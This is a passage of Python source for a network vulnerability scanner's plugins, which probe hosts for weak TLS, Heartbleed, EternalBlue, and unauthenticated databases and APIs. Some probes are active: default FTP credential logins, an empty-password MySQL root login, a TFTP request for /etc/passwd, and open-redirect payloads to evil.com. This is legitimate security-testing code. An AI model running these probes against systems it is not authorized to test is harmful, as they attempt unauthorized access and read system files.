                cert = ssock.getpeercert()
                cipher_info = ssock.cipher()
                if cert:
                    subj = dict(x[0] for x in cert.get("subject", []))
                    issr = dict(x[0] for x in cert.get("issuer", []))
                    if subj == issr:
                        findings.append("WARN: Self-signed certificate")
                if cipher_info:
                    cipher_name = cipher_info[0]
                    if any(w in cipher_name.upper() for w in
                           ["RC4", "DES", "NULL", "EXPORT", "ANON", "MD5"]):
                        findings.append(f"WEAK cipher: {cipher_name}")
    except Exception:
        pass

    if findings:
        return PluginResult(
            plugin="ssl-weak-ciphers", port=port,
            output="\n".join(findings),
            data={"findings": findings, "vulnerable": True})
    return PluginResult(
        plugin="ssl-weak-ciphers", port=port,
        output="TLS: no obvious weak ciphers detected",
        data={"vulnerable": False})


def _plugin_http_security_headers(ip: str, port: int,
                                   timeout: float) -> Optional[PluginResult]:
    """Check for missing HTTP security headers (HSTS, CSP, X-Frame, etc.)."""
    use_ssl = port in SSL_PORTS
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=ip)
        sock.sendall(
            f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
            .encode())
        raw = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                raw += chunk
                if b"\r\n\r\n" in raw: break
        except Exception:
            pass
        sock.close()

        headers_raw = raw.decode("utf-8", errors="replace").lower()
        missing: List[str] = []
        security_headers = {
            "strict-transport-security": "Missing HSTS",
            "content-security-policy":   "Missing CSP",
            "x-frame-options":           "Missing X-Frame-Options",
            "x-content-type-options":    "Missing X-Content-Type-Options",
            "x-xss-protection":          "Missing X-XSS-Protection",
            "referrer-policy":           "Missing Referrer-Policy",
        }
        for hdr, label in security_headers.items():
            if hdr not in headers_raw:
                missing.append(label)

        if missing:
            return PluginResult(
                plugin="http-security-headers", port=port,
                output="Missing security headers: " + ", ".join(missing),
                data={"missing": missing})
        return PluginResult(
            plugin="http-security-headers", port=port,
            output="HTTP security headers: all present",
            data={"missing": []})
    except Exception:
        return None


def _plugin_default_creds(ip: str, port: int,
                           timeout: float) -> Optional[PluginResult]:
    """Test common default credentials for FTP, Redis, MongoDB."""
    if port == 21:   # FTP
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            sock.recv(1024)
            for user, pwd in [("admin","admin"), ("admin",""), ("root","root")]:
                sock.sendall(f"USER {user}\r\n".encode())
                r1 = sock.recv(256).decode("utf-8", errors="replace")
                sock.sendall(f"PASS {pwd}\r\n".encode())
                r2 = sock.recv(256).decode("utf-8", errors="replace")
                if r2.startswith("2"):
                    sock.close()
                    return PluginResult(
                        plugin="default-creds", port=port,
                        output=f"FTP default creds work: {user}/{pwd}",
                        data={"service": "ftp", "user": user, "pass": pwd,
                              "vulnerable": True})
            sock.close()
        except Exception:
            pass

    elif port == 6379:  # Redis
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            sock.sendall(b"PING\r\n")
            r = sock.recv(256)
            sock.close()
            if r.startswith(b"+PONG"):
                return PluginResult(
                    plugin="default-creds", port=port,
                    output="Redis: no authentication required (UNAUTHENTICATED)",
                    data={"service": "redis", "vulnerable": True})
        except Exception:
            pass

    elif port == 27017:  # MongoDB
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            # Minimal isMaster query
            sock.sendall(
                b"\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
                b"\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00"
                b"\x00\x00\x00\x00\x01\x00\x00\x00\x13\x00\x00\x00"
                b"\x10isMaster\x00\x01\x00\x00\x00\x00")
            r = sock.recv(512).decode("utf-8", errors="replace")
            sock.close()
            if "ismaster" in r.lower() or "isWritablePrimary" in r:
                return PluginResult(
                    plugin="default-creds", port=port,
                    output="MongoDB: responds to unauthenticated queries",
                    data={"service": "mongodb", "vulnerable": True})
        except Exception:
            pass
    return None


def _plugin_open_redirect(ip: str, port: int,
                           timeout: float) -> Optional[PluginResult]:
    """Test for open redirect via common query string patterns."""
    use_ssl = port in SSL_PORTS
    scheme  = "https" if use_ssl else "http"
    PAYLOADS = [
        "/?url=http://evil.com",
        "/?redirect=http://evil.com",
        "/?next=http://evil.com",
        "/?return=http://evil.com",
    ]
    try:
        for path in PAYLOADS:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=ip)
            req = (f"GET {path} HTTP/1.0\r\nHost: {ip}\r\n\r\n").encode()
            sock.sendall(req)
            try:
                resp = sock.recv(1024).decode("utf-8", errors="replace")
            except Exception:
                resp = ""
            try: sock.close()
            except Exception: pass
            if "http://evil.com" in resp and (
                    "301" in resp or "302" in resp or "Location" in resp):
                return PluginResult(
                    plugin="open-redirect", port=port,
                    output=f"Open redirect detected via {path}",
                    data={"path": path, "vulnerable": True})
    except Exception:
        pass
    return None


def _plugin_smb_signing(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Check whether SMB signing is required (disabled = MITM risk)."""
    smb_neg = (
        b"\x00\x00\x00\x85"
        b"\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\xff\xfe\x00\x00\x00\x00"
        b"\x00\x62\x00\x02NT LM 0.12\x00"
        b"\x02SMB 2.002\x00\x02SMB 2.???\x00"
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.sendall(smb_neg)
        raw = sock.recv(512)
        sock.close()
        # Check SecurityMode byte in SMBv2 negotiate response
        # Byte 70 in a typical negotiate response contains SecurityMode
        # Bit 0 = signing enabled; bit 1 = signing required
        if len(raw) > 70:
            sec_mode = raw[70] if len(raw) > 70 else 0
            signing_required = bool(sec_mode & 0x02)
            signing_enabled  = bool(sec_mode & 0x01)
            if not signing_required:
                return PluginResult(
                    plugin="smb-signing", port=port,
                    output=("SMB signing NOT required — MITM attack possible"
                            if not signing_enabled
                            else "SMB signing enabled but not required"),
                    data={"signing_required": False,
                          "vulnerable": not signing_required})
            return PluginResult(
                plugin="smb-signing", port=port,
                output="SMB signing required (secure)",
                data={"signing_required": True, "vulnerable": False})
    except Exception:
        pass
    return None


def _plugin_docker_unauth(ip: str, port: int,
                           timeout: float) -> Optional[PluginResult]:
    """Check for unauthenticated Docker API exposure."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.sendall(b"GET /version HTTP/1.0\r\n\r\n")
        raw = sock.recv(2048).decode("utf-8", errors="replace")
        sock.close()
        if '"Version"' in raw and '"ApiVersion"' in raw:
            m = re.search(r'"Version"\s*:\s*"([\d.]+)"', raw)
            ver = m.group(1) if m else "?"
            return PluginResult(
                plugin="docker-unauth", port=port,
                output=f"Docker {ver} API exposed WITHOUT authentication! "
                       f"CRITICAL: remote code execution possible.",
                data={"version": ver, "vulnerable": True,
                      "severity": "CRITICAL"})
    except Exception:
        pass
    return None


# ── V9-3: Additional Vulnerability / Recon Plugins (20 new) ──────

def _plugin_heartbleed(ip: str, port: int,
                       timeout: float) -> Optional[PluginResult]:
    """Send Heartbleed TLS heartbeat probe (CVE-2014-0160)."""
    # TLS 1.0 ClientHello + Heartbeat extension
    hello = (
        b"\x16\x03\x01\x00\x31"        # TLS Record: Handshake, v1.0, 49 bytes
        b"\x01\x00\x00\x2d"            # ClientHello
        b"\x03\x01"                    # TLS version 1.0
        + b"\x00" * 32                  # random
        + b"\x00"                       # session ID length
        + b"\x00\x02\x00\x2f"         # cipher suites (AES-128-SHA)
        + b"\x01\x00"                  # compression null
        + b"\x00\x00"                  # extensions length 0
    )
    heartbeat = (
        b"\x18\x03\x01\x00\x03"       # TLS Record: Heartbeat
        b"\x01\xff\x00"               # type=request, length=65280
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(hello)
        s.recv(4096)   # server hello
        s.sendall(heartbeat)
        resp = s.recv(4096)
        s.close()
        if len(resp) > 3 and resp[0] == 0x18:
            return PluginResult(
                plugin="heartbleed", port=port,
                output="VULNERABLE to Heartbleed (CVE-2014-0160)! "
                       "Memory disclosure possible.",
                data={"cve": "CVE-2014-0160", "vulnerable": True,
                      "severity": "CRITICAL"})
        return PluginResult(plugin="heartbleed", port=port,
                             output="Heartbleed: not vulnerable",
                             data={"vulnerable": False})
    except Exception:
        return None


def _plugin_ms17_010(ip: str, port: int,
                     timeout: float) -> Optional[PluginResult]:
    """Check for MS17-010 (EternalBlue) SMB vulnerability."""
    # SMBv1 Negotiate + check for unpatched server
    neg = (
        b"\x00\x00\x00\x54"                    # NetBIOS
        b"\xff\x53\x4d\x42\x72\x00\x00\x00"  # SMB magic + Negotiate
        b"\x00\x18\x01\x20\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\xff\xfe\x00\x00\x00\x00"
        b"\x00\x31\x00\x02NT LM 0.12\x00"
        b"\x02SMB 2.002\x00"
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(neg)
        r = s.recv(512)
        s.close()
        if len(r) > 40:
            # Heuristic: SMBv1 accepted + older server = potentially vulnerable
            if b"\xffSMB" in r:
                return PluginResult(
                    plugin="ms17-010", port=port,
                    output="SMBv1 enabled — potentially vulnerable to EternalBlue "
                           "(CVE-2017-0144). Manual verification required.",
                    data={"cve": "CVE-2017-0144", "smb_v1": True,
                          "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_http_methods(ip: str, port: int,
                          timeout: float) -> Optional[PluginResult]:
    """Check for dangerous HTTP methods: PUT, DELETE, TRACE, CONNECT."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(b"OPTIONS / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        raw = s.recv(2048).decode("utf-8", errors="replace")
        s.close()
        m = re.search(r"Allow:\s*(.+)", raw, re.IGNORECASE)
        if m:
            methods = [x.strip().upper() for x in m.group(1).split(",")]
            dangerous = [m for m in methods
                         if m in {"PUT", "DELETE", "TRACE", "CONNECT"}]
            if dangerous:
                return PluginResult(
                    plugin="http-methods", port=port,
                    output=f"Dangerous HTTP methods allowed: {', '.join(dangerous)}",
                    data={"methods": methods, "dangerous": dangerous})
            return PluginResult(
                plugin="http-methods", port=port,
                output=f"HTTP methods: {', '.join(methods[:6])}",
                data={"methods": methods})
    except Exception:
        pass
    return None


def _plugin_dns_zone_transfer(ip: str, port: int,
                               timeout: float) -> Optional[PluginResult]:
    """Attempt DNS AXFR zone transfer (CVE-old but still common misconfig)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        # DNS AXFR for "." (root) — will reveal if zone transfer is allowed
        axfr = (b"\x00\x1c"              # length prefix
                b"\xab\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\xfc\x00\x01")  # AXFR query for .
        s.sendall(axfr)
        r = s.recv(256)
        s.close()
        if len(r) > 12 and r[2:4] in (b"\x80\x00", b"\x85\x80"):
            return PluginResult(
                plugin="dns-zone-transfer", port=port,
                output="DNS zone transfer ALLOWED (AXFR misconfig)",
                data={"vulnerable": True})
        return PluginResult(plugin="dns-zone-transfer", port=port,
                             output="DNS zone transfer: denied (secure)",
                             data={"vulnerable": False})
    except Exception:
        return None


def _plugin_smtp_open_relay(ip: str, port: int,
                             timeout: float) -> Optional[PluginResult]:
    """Test for open SMTP relay (mail forwarding without auth)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(512)  # banner
        s.sendall(b"EHLO pyscanner.test\r\n"); s.recv(512)
        s.sendall(b"MAIL FROM:<test@pyscanner.test>\r\n")
        r1 = s.recv(256).decode("utf-8", errors="replace")
        s.sendall(b"RCPT TO:<victim@external-domain.com>\r\n")
        r2 = s.recv(256).decode("utf-8", errors="replace")
        s.sendall(b"QUIT\r\n")
        s.close()
        if r2.startswith("2"):
            return PluginResult(
                plugin="smtp-open-relay", port=port,
                output="SMTP open relay DETECTED — external mail relay possible",
                data={"vulnerable": True, "severity": "HIGH"})
        return PluginResult(plugin="smtp-open-relay", port=port,
                             output="SMTP relay: denied (secure)",
                             data={"vulnerable": False})
    except Exception:
        return None


def _plugin_ssh_hostkey(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Extract SSH host key fingerprint and algorithm."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(256).decode("utf-8", errors="replace").strip()
        s.sendall(b"SSH-2.0-PyScanner_9.0\r\n")
        kex = s.recv(2048)
        s.close()
        # Parse host key algorithm from KEX_INIT (byte 17 starts algorithms)
        algo = "unknown"
        if len(kex) > 22:
            try:
                # Skip packet_length(4) + padding_length(1) + msg_type(1) + cookie(16)
                off = 22
                if off + 4 <= len(kex):
                    kex_algos_len = struct.unpack("!I", kex[off:off+4])[0]
                    off += 4 + kex_algos_len
                    if off + 4 <= len(kex):
                        ha_len = struct.unpack("!I", kex[off:off+4])[0]
                        if ha_len > 0 and off + 4 + ha_len <= len(kex):
                            algo = kex[off+4: off+4+ha_len].decode(
                                "ascii", errors="replace").split(",")[0]
            except Exception:
                pass
        m = re.search(r"SSH-[\d.]+-(.+)", banner)
        software = m.group(1) if m else "?"
        return PluginResult(
            plugin="ssh-hostkey", port=port,
            output=f"SSH host key algo: {algo}  software: {software}",
            data={"algorithm": algo, "software": software, "banner": banner})
    except Exception:
        return None


def _plugin_telnet_banner(ip: str, port: int,
                           timeout: float) -> Optional[PluginResult]:
    """Grab telnet banner — its presence alone is a security finding."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        raw = s.recv(256)
        s.close()
        # Strip telnet IAC sequences
        clean = bytes(b for b in raw if b < 0x80).decode(
            "utf-8", errors="replace").strip()[:80]
        return PluginResult(
            plugin="telnet-banner", port=port,
            output=f"TELNET service detected (plaintext!) — banner: {clean or '(none)'}",
            data={"banner": clean, "severity": "MEDIUM"})
    except Exception:
        return None


def _plugin_vnc_no_auth(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Check for VNC with no authentication (SecurityType=1)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(32).decode("utf-8", errors="replace")
        if not banner.startswith("RFB"):
            s.close(); return None
        ver = banner.strip()
        # Send our version
        s.sendall(b"RFB 003.008\n")
        sec_types_raw = s.recv(64)
        s.close()
        if len(sec_types_raw) >= 2:
            n = sec_types_raw[0]
            types = list(sec_types_raw[1:1+n]) if n > 0 else []
            if 1 in types:
                return PluginResult(
                    plugin="vnc-no-auth", port=port,
                    output=f"VNC {ver}: None authentication (SecurityType=1) — "
                           "UNAUTHENTICATED ACCESS possible",
                    data={"vnc_version": ver, "sec_types": types,
                          "no_auth": True, "severity": "CRITICAL"})
            return PluginResult(
                plugin="vnc-no-auth", port=port,
                output=f"VNC {ver}: authentication required (types={types})",
                data={"no_auth": False})
    except Exception:
        return None


def _plugin_http_robots(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Fetch /robots.txt to enumerate hidden paths."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(
            f"GET /robots.txt HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
        raw = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if "200" in raw[:20]:
            body  = raw.split("\r\n\r\n", 1)[-1]
            paths = [l.split(":",1)[1].strip() for l in body.splitlines()
                     if l.lower().startswith("disallow:") and len(l) > 10]
            if paths:
                return PluginResult(
                    plugin="http-robots", port=port,
                    output=f"robots.txt: {len(paths)} Disallow paths: "
                           + ", ".join(paths[:5]),
                    data={"disallow_paths": paths})
    except Exception:
        pass
    return None


def _plugin_mysql_empty_password(ip: str, port: int,
                                  timeout: float) -> Optional[PluginResult]:
    """Check if MySQL root has empty password via handshake."""
    # MySQL Client Auth with empty password
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        server_hello = s.recv(512)
        if not server_hello or server_hello[4] != 10:
            s.close(); return None  # not MySQL greeting

        # Send auth packet: user=root, password=empty
        auth = (b"\x52\x00\x00\x01"       # length + seq
                b"\x85\xa6\x3f\x20"       # capabilities
                b"\x00\x00\x00\x01"       # max packet
                b"\x21"                    # charset utf8
                + b"\x00"*23              # reserved
                + b"root\x00"             # username
                + b"\x00")               # empty password (auth_response_length=0)
        s.sendall(auth)
        resp = s.recv(128)
        s.close()
        if resp and resp[4] == 0x00:
            return PluginResult(
                plugin="mysql-empty-password", port=port,
                output="MySQL root login with empty password SUCCEEDED — "
                       "CRITICAL misconfiguration",
                data={"vulnerable": True, "severity": "CRITICAL"})
        return PluginResult(plugin="mysql-empty-password", port=port,
                             output="MySQL: root empty-password auth failed (secure)",
                             data={"vulnerable": False})
    except Exception:
        return None


def _plugin_ntp_monlist(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Test for NTP monlist amplification (CVE-2013-5211)."""
    # NTP MON_LIST request (mode 7, opcode 42)
    monlist_req = (
        b"\x17\x00\x03\x2a" + b"\x00"*4)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(monlist_req, (ip, port))
        resp, _ = s.recvfrom(4096)
        s.close()
        if len(resp) > 8 and resp[0] == 0x97:
            return PluginResult(
                plugin="ntp-monlist", port=port,
                output=f"NTP monlist ENABLED ({len(resp)} bytes response) — "
                       "CVE-2013-5211 amplification possible",
                data={"cve": "CVE-2013-5211", "vulnerable": True,
                      "response_bytes": len(resp), "severity": "HIGH"})
        return PluginResult(plugin="ntp-monlist", port=port,
                             output="NTP monlist: disabled (secure)",
                             data={"vulnerable": False})
    except Exception:
        return None


def _plugin_elasticsearch_unauth(ip: str, port: int,
                                  timeout: float) -> Optional[PluginResult]:
    """Check for unauthenticated Elasticsearch cluster access."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b"GET /_cluster/health HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        raw = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if '"cluster_name"' in raw or '"status"' in raw:
            m = re.search(r'"cluster_name"\s*:\s*"([^"]+)"', raw)
            cname = m.group(1) if m else "unknown"
            return PluginResult(
                plugin="elasticsearch-unauth", port=port,
                output=f"Elasticsearch UNAUTHENTICATED: cluster '{cname}' exposed",
                data={"cluster": cname, "vulnerable": True, "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_k8s_unauth(ip: str, port: int,
                        timeout: float) -> Optional[PluginResult]:
    """Check for unauthenticated Kubernetes API access."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if port == 6443:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(b"GET /version HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        raw = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if '"gitVersion"' in raw:
            m = re.search(r'"gitVersion"\s*:\s*"v([\d.]+)"', raw)
            ver = m.group(1) if m else "?"
            return PluginResult(
                plugin="k8s-unauth", port=port,
                output=f"Kubernetes API v{ver} exposed without authentication!",
                data={"k8s_version": ver, "vulnerable": True, "severity": "CRITICAL"})
    except Exception:
        pass
    return None


def _plugin_memcached_unauth(ip: str, port: int,
                              timeout: float) -> Optional[PluginResult]:
    """Check for unauthenticated Memcached access + amplification risk."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b"stats\r\n")
        raw = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if "STAT " in raw:
            m = re.search(r"STAT version\s+([\d.]+)", raw)
            ver = m.group(1) if m else "?"
            return PluginResult(
                plugin="memcached-unauth", port=port,
                output=f"Memcached {ver}: UNAUTHENTICATED access + UDP amplification risk",
                data={"version": ver, "vulnerable": True, "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_rsync_unauth(ip: str, port: int,
                          timeout: float) -> Optional[PluginResult]:
    """Check for unauthenticated rsync module listing."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(128).decode("utf-8", errors="replace")
        if "@RSYNCD" not in banner.upper():
            s.close(); return None
        # Request module list
        s.sendall(b"#list\n")
        modules = s.recv(2048).decode("utf-8", errors="replace")
        s.close()
        mod_list = [l.strip() for l in modules.splitlines()
                    if l.strip() and not l.startswith("@")]
        if mod_list:
            return PluginResult(
                plugin="rsync-unauth", port=port,
                output=f"Rsync module list exposed: {', '.join(mod_list[:5])}",
                data={"modules": mod_list, "vulnerable": True})
        return PluginResult(plugin="rsync-unauth", port=port,
                             output="Rsync: no accessible modules",
                             data={"vulnerable": False})
    except Exception:
        return None


def _plugin_snmp_community(ip: str, port: int,
                            timeout: float) -> Optional[PluginResult]:
    """Test SNMP v1/v2c default community string 'public'."""
    # SNMPv1 GetRequest for sysDescr.0
    snmp_req = (
        b"\x30\x26"                           # SEQUENCE
        b"\x02\x01\x00"                       # version: 0 (v1)
        b"\x04\x06public"                     # community: public
        b"\xa0\x19"                           # GetRequest-PDU
        b"\x02\x04\x00\x00\x00\x01"          # request-id
        b"\x02\x01\x00"                       # error-status
        b"\x02\x01\x00"                       # error-index
        b"\x30\x0b\x30\x09"                   # variable bindings
        b"\x06\x05\x2b\x06\x01\x02\x01"      # OID 1.3.6.1.2.1
        b"\x05\x00"                            # Null
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(snmp_req, (ip, port))
        resp, _ = s.recvfrom(4096)
        s.close()
        if resp and resp[0] == 0x30:
            desc_m = re.search(rb"(Linux|Windows|Cisco|FreeBSD|[\w\s]+\d+\.\d+)", resp)
            desc = desc_m.group(1).decode("utf-8", errors="replace") if desc_m else "?"
            return PluginResult(
                plugin="snmp-community", port=port,
                output=f"SNMP 'public' community accepted: sysDescr={desc}",
                data={"community": "public", "sysDescr": desc,
                      "vulnerable": True, "severity": "MEDIUM"})
    except Exception:
        pass
    return None


def _plugin_ldap_rootdse(ip: str, port: int,
                          timeout: float) -> Optional[PluginResult]:
    """Query LDAP rootDSE anonymously — reveals server info."""
    # Minimal LDAP search request for rootDSE
    ldap_search = (
        b"\x30\x26"           # SEQUENCE (38 bytes)
        b"\x02\x01\x01"       # messageID: 1
        b"\x63\x21"           # SearchRequest
        b"\x04\x00"           # baseObject: ""
        b"\x0a\x01\x00"       # scope: baseObject(0)
        b"\x0a\x01\x00"       # derefAliases: neverDerefAliases
        b"\x02\x01\x00"       # sizeLimit: 0
        b"\x02\x01\x00"       # timeLimit: 0
        b"\x01\x01\x00"       # typesOnly: FALSE
        b"\x87\x0b"
        b"objectClass"        # filter: present(objectClass)
        b"\x30\x00"           # attributes: [] (all)
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(ldap_search)
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if len(resp) > 10:
            vendor = re.search(r"(OpenLDAP|Active Directory|Samba|389)", resp)
            vend_s = vendor.group(1) if vendor else "LDAP server"
            return PluginResult(
                plugin="ldap-rootdse", port=port,
                output=f"{vend_s}: anonymous bind accepted — rootDSE exposed",
                data={"vendor": vend_s, "anonymous_bind": True})
    except Exception:
        pass
    return None


def _plugin_pop3_capabilities(ip: str, port: int,
                               timeout: float) -> Optional[PluginResult]:
    """Query POP3 CAPA command to list supported capabilities."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(256)  # banner
        s.sendall(b"CAPA\r\n")
        raw = s.recv(1024).decode("utf-8", errors="replace")
        s.close()
        caps = [l.strip() for l in raw.splitlines()
                if l.strip() and not l.startswith("+") and l.strip() != "."]
        if caps:
            stls = "STLS" in raw
            return PluginResult(
                plugin="pop3-capabilities", port=port,
                output=f"POP3 CAPA: {', '.join(caps[:6])}"
                       + ("" if stls else " — WARN: no STLS (plaintext)"),
                data={"capabilities": caps, "stls": stls})
    except Exception:
        pass
    return None


def _plugin_iis_webdav(ip: str, port: int,
                        timeout: float) -> Optional[PluginResult]:
    """Check if IIS WebDAV is enabled (PROPFIND method)."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        req = (b"PROPFIND / HTTP/1.0\r\n"
               b"Depth: 0\r\n"
               b"Content-Type: text/xml\r\n\r\n")
        s.sendall(req)
        raw = s.recv(1024).decode("utf-8", errors="replace")
        s.close()
        if "207" in raw[:20] or "WebDAV" in raw or "DAV:" in raw:
            return PluginResult(
                plugin="iis-webdav", port=port,
                output="WebDAV enabled — file upload/modification may be possible",
                data={"webdav": True, "severity": "MEDIUM"})
    except Exception:
        pass
    return None


def _plugin_tftp_test(ip: str, port: int,
                       timeout: float) -> Optional[PluginResult]:
    """Test if TFTP responds (unauthenticated file server)."""
    rrq = b"\x00\x01/etc/passwd\x00octet\x00"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(rrq, (ip, port))
        resp, _ = s.recvfrom(512)
        s.close()
        if len(resp) >= 4:
            opcode = struct.unpack("!H", resp[:2])[0]
            if opcode in (3, 5):
                return PluginResult(
                    plugin="tftp-test", port=port,
                    output="TFTP server active — unauthenticated file access possible",
                    data={"responsive": True, "severity": "MEDIUM"})
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════════
# [ENH-7] EXPANDED VULNERABILITY & RECON PLUGINS
# ═══════════════════════════════════════════════════════════════════

def _plugin_ssl_poodle(ip: str, port: int,
                        timeout: float) -> Optional[PluginResult]:
    """
    Detect SSLv3 support (POODLE attack surface, CVE-2014-3566).
    Attempts TLS negotiation forcing SSLv3; if server accepts → vulnerable.
    """
    try:
        import ssl as _ssl
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = _ssl.CERT_NONE
        # Force maximum compat to probe for old protocol acceptance
        ctx.set_ciphers("ALL:@SECLEVEL=0")
        ctx.options |= getattr(_ssl, "OP_NO_TLSv1_3", 0)
        ctx.options |= getattr(_ssl, "OP_NO_TLSv1_2", 0)
        ctx.options |= getattr(_ssl, "OP_NO_TLSv1_1", 0)
        ctx.options |= getattr(_ssl, "OP_NO_TLSv1",   0)
        # If SSLv3 is disabled in this Python build, we can't probe directly
        # Instead, negotiate lowest TLS and check protocol version
        ctx2 = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx2.check_hostname = False
        ctx2.verify_mode    = _ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as raw:
            with ctx2.wrap_socket(raw, server_hostname=ip) as s:
                proto = s.version()
                cipher_name, proto_v, bits = s.cipher()
        if proto in ("SSLv3", "TLSv1", "TLSv1.0"):
            sev = "CRITICAL" if proto == "SSLv3" else "HIGH"
            return PluginResult(
                plugin="ssl-poodle", port=port,
                output=f"VULNERABLE: Server accepted {proto} ({sev}). "
                       f"SSLv3=POODLE / TLSv1.0=BEAST attack surface.",
                data={"protocol": proto, "severity": sev,
                      "cve": "CVE-2014-3566"})
        return PluginResult(
            plugin="ssl-poodle", port=port,
            output=f"OK: Minimum protocol {proto} (POODLE not applicable)",
            data={"protocol": proto, "severity": "INFO"})
    except Exception:
        return None


